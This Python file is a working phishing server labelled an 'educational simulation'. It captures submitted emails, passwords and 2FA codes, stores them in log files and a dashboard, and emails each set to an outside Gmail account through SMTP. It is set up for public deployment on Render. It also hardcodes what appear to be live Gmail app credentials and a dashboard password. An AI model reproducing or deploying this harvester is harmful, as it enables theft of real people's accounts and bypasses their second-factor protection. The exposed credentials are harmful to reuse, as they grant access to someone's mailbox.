#!/usr/bin/env python3
# ADVANCED EDUCATIONAL PHISHING SIMULATION - Educational Purposes Only
# WARNING: Only deploy in controlled environments with explicit consent

from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse
from datetime import datetime
import os
import json
import hashlib
import secrets
from urllib.parse import urlparse, parse_qs
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart

# ===== CONFIGURATION =====
# Change this password to something strong!
DASHBOARD_PASSWORD = "phishing@10$"  # CHANGE THIS!

# ===== EMAIL CONFIGURATION =====
GMAIL_USER = "ifiwas1898617@gmail.com"  # Replace with YOUR email
GMAIL_PASSWORD = "qszetclmnqtshaoe"  # Your app password (no spaces!)
NOTIFY_EMAIL = "ifiwas1898617@gmail.com"  # Where to send notifications
# ================================

class AdvancedPhishingSimHandler(BaseHTTPRequestHandler):
    
    def send_email_notification(self, email, password, totp, ip):
        """Send captured credentials via email"""
        try:
            msg = MIMEMultipart()
            msg['From'] = GMAIL_USER
            msg['To'] = NOTIFY_EMAIL
            msg['Subject'] = f"🔐 New Credential: {email}"
            
            body = f"""
═══════════════════════════════════════
🔐 NEW CREDENTIALS CAPTURED
═══════════════════════════════════════

📧 Email:    {email}
🔑 Password: {password}
📱 2FA Code: {totp if totp else 'N/A'}
🌐 IP:       {ip}
🕐 Time:     {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

═══════════════════════════════════════
📍 Phishing Simulation - Educational Only
"""
            
            msg.attach(MIMEText(body, 'plain'))
            
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(GMAIL_USER, GMAIL_PASSWORD)
            server.send_message(msg)
            server.quit()
            
            print(f"[✓] Email sent for: {email}")
        except Exception as e:
            print(f"[✗] Email failed: {e}")
    
    def check_auth(self, path):
        """Check if the request is authorized for protected pages"""
        parsed = urlparse(path)
        params = parse_qs(parsed.query)
        
        # Check for password in URL parameters
        if params.get('pass', [''])[0] == DASHBOARD_PASSWORD:
            return True
        
        # Check for Authorization header (for basic auth)
        auth_header = self.headers.get('Authorization')
        if auth_header:
            import base64
            try:
                auth_type, auth_string = auth_header.split(' ', 1)
                if auth_type.lower() == 'basic':
                    decoded = base64.b64decode(auth_string).decode('utf-8')
                    username, password = decoded.split(':', 1)
                    if password == DASHBOARD_PASSWORD:
                        return True
            except:
                pass
        
        return False
    
    def send_unauthorized(self):
        """Send unauthorized response"""
        self.send_response(401)
        self.send_header('WWW-Authenticate', 'Basic realm="Dashboard"')
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b'''
        <!DOCTYPE html>
        <html>
        <head><title>Unauthorized</title></head>
        <body>
            <h1>Access Denied</h1>
            <p>This area is protected. Please use the correct password.</p>
            <p><a href="/">Return to Home</a></p>
        </body>
        </html>
        ''')
    
    def do_GET(self):
        """Serve pages based on request path"""
        
        if self.path == '/' or self.path == '/index.html':
            self.serve_file('index.html', 'text/html')
            
        elif self.path == '/error.html':
            self.serve_file('error.html', 'text/html')
            
        elif self.path.startswith('/dashboard'):
            # Check authentication
            if not self.check_auth(self.path):
                self.send_unauthorized()
                return
            self.serve_dashboard()
            
        elif self.path.startswith('/stats'):
            # Check authentication for stats too
            if not self.check_auth(self.path):
                self.send_unauthorized()
                return
            self.serve_stats()
            
        elif self.path == '/clear_logs':
            if not self.check_auth(self.path):
                self.send_unauthorized()
                return
            self.clear_logs()
            
        else:
            self.send_response(404)
            self.end_headers()
            self.wfile.write(b'Page not found')
    
    def serve_file(self, filename, content_type):
        """Helper to serve HTML files"""
        try:
            with open(filename, 'rb') as f:
                self.send_response(200)
                self.send_header('Content-type', content_type)
                self.end_headers()
                self.wfile.write(f.read())
        except FileNotFoundError:
            self.send_response(404)
            self.end_headers()
    
    def serve_dashboard(self):
        """Show a dashboard of captured credentials"""
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        
        # Read captured credentials
        captured_data = ""
        json_data = []
        
        if os.path.exists('captured_log.txt'):
            with open('captured_log.txt', 'r') as f:
                captured_data = f.read()
        
        if os.path.exists('detailed_log.json'):
            with open('detailed_log.json', 'r') as f:
                json_data = json.load(f)
        
        # Generate stats
        total_attempts = len(json_data) if json_data else 0
        unique_ips = len(set(entry.get('ip', '') for entry in json_data)) if json_data else 0
        
        dashboard_html = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>Phishing Simulation Dashboard</title>
            <style>
                body {{ font-family: monospace; background: #0a0e27; color: #00ff00; padding: 20px; }}
                .container {{ max-width: 1200px; margin: 0 auto; }}
                .card {{ background: #1a1f3a; padding: 20px; margin: 20px 0; border-radius: 8px; border-left: 4px solid #00ff00; }}
                .card-red {{ background: #1a1f3a; padding: 20px; margin: 20px 0; border-radius: 8px; border-left: 4px solid #ff0000; }}
                h1, h2 {{ color: #00ff00; }}
                pre {{ background: #0d1127; padding: 15px; overflow-x: auto; white-space: pre-wrap; border-radius: 4px; }}
                .warning {{ background: #ff000020; border-left-color: #ff0000; }}
                button {{ background: #00ff00; color: #0a0e27; padding: 10px 20px; border: none; cursor: pointer; margin: 10px; border-radius: 4px; }}
                button:hover {{ background: #00cc00; }}
                .nav {{ margin-bottom: 20px; }}
                a {{ color: #00ff00; margin-right: 20px; text-decoration: none; }}
                a:hover {{ text-decoration: underline; }}
                .stats-grid {{ display: grid; grid-template-columns: repeat(2, 1fr); gap: 20px; }}
                .stat-box {{ background: #0d1127; padding: 20px; border-radius: 8px; text-align: center; }}
                .stat-number {{ font-size: 48px; font-weight: bold; color: #00ff00; }}
                .stat-label {{ color: #8899a6; margin-top: 10px; }}
                .footer {{ margin-top: 40px; text-align: center; color: #8899a6; font-size: 12px; }}
            </style>
        </head>
        <body>
            <div class="container">
                <h1>[+] Phishing Simulation Dashboard</h1>
                <div class="nav">
                    <a href="/"> Home</a>
                    <a href="/dashboard?pass={DASHBOARD_PASSWORD}">Dashboard</a>
                    <a href="/stats?pass={DASHBOARD_PASSWORD}"> Statistics</a>
                    <a href="/error.html">Error Page</a>
                </div>
                
                <div class="stats-grid">
                    <div class="stat-box">
                        <div class="stat-number">{total_attempts}</div>
                        <div class="stat-label">Total Login Attempts</div>
                    </div>
                    <div class="stat-box">
                        <div class="stat-number">{unique_ips}</div>
                        <div class="stat-label">Unique IP Addresses</div>
                    </div>
                </div>
                
                <div class="card">
                    <h2>Captured Credentials (Real-time)</h2>
                    <pre>{captured_data if captured_data else 'No credentials captured yet...'}</pre>
                </div>
                
                <div class="card card-red">
                    <h2> EDUCATIONAL USE ONLY</h2>
                    <p>This dashboard shows captured credentials for security awareness training.</p>
                    <p><strong> Dashboard is password protected</strong></p>
                    <p><strong>All data is ephemeral</strong> - Will be lost when server restarts</p>
                    <form action="/clear_logs?pass={DASHBOARD_PASSWORD}" method="POST">
                        <button type="submit" onclick="return confirm(' WARNING: This will permanently delete ALL captured credentials. Are you sure?')">
                            Clear All Logs
                        </button>
                    </form>
                </div>
                
                <div class="footer">
                    <p>Security dashboard</p>
                    <p>Access dashboard with: ?pass={DASHBOARD_PASSWORD}</p>
                </div>
            </div>
        </body>
        </html>
        """
        self.wfile.write(dashboard_html.encode())
    
    def serve_stats(self):
        """Show statistics about the simulation"""
        stats = {
            'total_attempts': 0,
            'unique_ips': set(),
            'latest_attempts': []
        }
        
        if os.path.exists('detailed_log.json'):
            with open('detailed_log.json', 'r') as f:
                logs = json.load(f)
                stats['total_attempts'] = len(logs)
                stats['unique_ips'] = set(entry.get('ip', '') for entry in logs)
                stats['latest_attempts'] = logs[-5:] if logs else []
        
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        
        latest_html = ""
        for attempt in stats['latest_attempts']:
            latest_html += f"""
            <tr>
                <td>{attempt.get('timestamp', 'N/A')}</td>
                <td>{attempt.get('email', 'N/A')}</td>
                <td>{attempt.get('ip', 'N/A')}</td>
            </tr>
            """
        
        stats_html = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>Simulation Statistics</title>
            <style>
                body {{ font-family: Arial, sans-serif; background: #f0f2f5; padding: 20px; }}
                .container {{ max-width: 800px; margin: 0 auto; }}
                .stats {{ background: white; padding: 20px; margin: 10px 0; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }}
                .number {{ font-size: 48px; color: #4a90e2; font-weight: bold; }}
                h1 {{ color: #333; }}
                table {{ width: 100%; border-collapse: collapse; margin-top: 20px; }}
                th, td {{ padding: 10px; text-align: left; border-bottom: 1px solid #ddd; }}
                th {{ background: #4a90e2; color: white; }}
                tr:hover {{ background: #f5f5f5; }}
                .nav {{ margin-bottom: 20px; }}
                a {{ color: #4a90e2; text-decoration: none; margin-right: 20px; }}
                a:hover {{ text-decoration: underline; }}
            </style>
        </head>
        <body>
            <div class="container">
                <h1>Simulation Statistics</h1>
                <div class="nav">
                    <a href="/"> Home</a>
                    <a href="/dashboard?pass={DASHBOARD_PASSWORD}"> Dashboard</a>
                    <a href="/stats?pass={DASHBOARD_PASSWORD}"> Statistics</a>
                </div>
                
                <div class="stats">
                    <h2>Total Login Attempts</h2>
                    <div class="number">{stats['total_attempts']}</div>
                </div>
                
                <div class="stats">
                    <h2>Unique IP Addresses</h2>
                    <div class="number">{len(stats['unique_ips'])}</div>
                </div>
                
                <div class="stats">
                    <h2>Latest 5 Attempts</h2>
                    <table>
                        <thead>
                            <tr><th>Timestamp</th><th>Email</th><th>IP Address</th></tr>
                        </thead>
                        <tbody>
                            {latest_html if latest_html else '<tr><td colspan="3">No attempts yet</td></tr>'}
                        </tbody>
                    </table>
                </div>
                
                <div class="stats">
                    <p><a href="/dashboard?pass={DASHBOARD_PASSWORD}">← Back to Dashboard</a></p>
                </div>
            </div>
        </body>
        </html>
        """
        self.wfile.write(stats_html.encode())
    
    def clear_logs(self):
        """Clear all captured data"""
        if os.path.exists('captured_log.txt'):
            os.remove('captured_log.txt')
        if os.path.exists('detailed_log.json'):
            os.remove('detailed_log.json')
        
        print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [ADMIN] Logs cleared by authorized user")
        
        self.send_response(302)
        self.send_header('Location', f'/dashboard?pass={DASHBOARD_PASSWORD}')
        self.end_headers()
    
    def do_POST(self):
        """Handle POST requests and capture credentials"""
        
        if self.path == '/login':
            # Get form data
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            parsed_data = urllib.parse.parse_qs(post_data.decode('utf-8'))
            
            # Extract all fields
            email = parsed_data.get('email', [''])[0]
            password = parsed_data.get('password', [''])[0]
            totp = parsed_data.get('totp', [''])[0]
            
            # Get client info
            client_ip = self.headers.get('X-Forwarded-For', self.client_address[0])
            if client_ip and ',' in client_ip:
                client_ip = client_ip.split(',')[0].strip()
            
            user_agent = self.headers.get('User-Agent', 'Unknown')
            
            # Create timestamp
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            # Send email notification (DO THIS FIRST)
            self.send_email_notification(email, password, totp, client_ip)
            
            # Log to simple text file
            log_entry = f"[{timestamp}] IP: {client_ip} | Email: {email} | Password: {password} | 2FA: {totp}\n"
            with open('captured_log.txt', 'a') as f:
                f.write(log_entry)
            
            # Log to JSON
            detailed_entry = {
                'timestamp': timestamp,
                'ip': client_ip,
                'email': email,
                'password': password,
                'totp': totp if totp else None,
                'user_agent': user_agent,
                'attack_phase': 'initial'
            }
            
            if os.path.exists('detailed_log.json'):
                with open('detailed_log.json', 'r') as f:
                    logs = json.load(f)
            else:
                logs = []
            
            logs.append(detailed_entry)
            
            with open('detailed_log.json', 'w') as f:
                json.dump(logs, f, indent=2)
            
            # Console output (will appear in Render logs)
            print("\n" + "="*60)
            print(f"[!] CREDENTIALS CAPTURED - {timestamp}")
            print("="*60)
            print(f" Email:     {email}")
            print(f" Password:  {password}")
            if totp:
                print(f"📱 2FA Code:  {totp}")
            print(f" IP:        {client_ip}")
            print(f"  User Agent: {user_agent[:80]}...")
            print("="*60)
            
            # Send response - redirect to error page
            self.send_response(302)
            self.send_header('Location', '/error.html')
            self.end_headers()
            
        elif self.path.startswith('/clear_logs'):
            # Check authentication for clear_logs POST
            if not self.check_auth(self.path):
                self.send_unauthorized()
                return
            self.clear_logs()
            
        else:
            self.send_response(404)
            self.end_headers()
    
    def log_message(self, format, *args):
        """Custom log formatting for Render - suppress static file logs"""
        # Only log POST requests and errors
        if args[0] == 'POST':
            print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {args[0]} {args[1]}")

def run_server():
    """Run server on all interfaces for Render deployment"""
    # Get port from environment variable (Render sets this)
    port = int(os.environ.get('PORT', 5000))
    # Bind to all interfaces (0.0.0.0) instead of localhost
    server_address = ('0.0.0.0', port)
    httpd = HTTPServer(server_address, AdvancedPhishingSimHandler)
    
    print("\n" + "="*60)
    print("🔐 EDUCATIONAL PHISHING SIMULATION")
    print("="*60)
    print(f"✅ Server running on port {port}")
    print(f"🌐 Accessible at: https://your-render-url.onrender.com")
    print(f"\n🔑 Dashboard Password: {DASHBOARD_PASSWORD}")
    print(f"📊 Dashboard URL: /dashboard?pass={DASHBOARD_PASSWORD}")
    print(f"\n📧 Email notifications: ON - Sending to {NOTIFY_EMAIL}")
    print("\n⚠️  IMPORTANT SECURITY NOTES:")
    print("   - This is for EDUCATIONAL PURPOSES only")
    print("   - Only use with explicit participant consent")
    print("   - All captured data is ephemeral")
    print("   - Dashboard is password protected")
    print("\n📊 Endpoints:")
    print(f"   - Main page: /")
    print(f"   - Dashboard: /dashboard?pass={DASHBOARD_PASSWORD}")
    print(f"   - Statistics: /stats?pass={DASHBOARD_PASSWORD}")
    print("\n" + "="*60)
    print("Press Ctrl+C to stop\n")
    
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n🛑 Shutting down...")
        httpd.server_close()

if __name__ == '__main__':
    run_server()
# Redeploy trigger
